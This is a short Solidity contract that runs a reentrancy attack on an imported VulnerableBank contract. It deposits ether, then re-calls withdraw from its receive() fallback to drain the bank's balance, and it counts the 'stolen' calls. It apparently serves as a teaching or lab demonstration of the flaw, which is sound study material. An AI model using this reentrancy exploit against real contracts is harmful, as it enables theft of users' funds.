// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./VulnerableBank.sol";

contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public stolenCount;

    constructor(address _bank) {
        bank = VulnerableBank(payable(_bank));
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        stolenCount++;
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function getStolen() external view returns (uint256) {
        return address(this).balance;
    }
}
